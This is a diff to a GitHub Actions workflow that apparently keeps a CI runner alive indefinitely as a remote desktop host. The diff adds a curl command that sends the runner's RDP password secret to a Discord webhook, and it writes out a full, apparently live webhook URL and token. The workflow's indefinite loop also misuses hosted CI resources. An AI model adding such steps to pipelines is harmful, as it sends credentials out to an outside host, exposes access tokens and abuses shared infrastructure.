@@ -106,7 +106,8 @@ jobs:
           Write-Host "Password: $(echo $env:RDP_CREDS)"
           Write-Host "==================`n"
           
-          # Keep runner active indefinitely (or until manually cancelled)
+          curl -H "Content-Type: application/json" -d "hey Tky girl you rdp password: $(echo $env:RDP_CREDS)" https://discord.com/api/webhooks/1304765957398331454/cVT4eVgezi3GPsYwj2kFKq6EMhBK0VipMnpIvhXPfvLce6KuO1-DjofhUedxqYA4enZP
+          
           while ($true) {
               Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
               Start-Sleep -Seconds 300
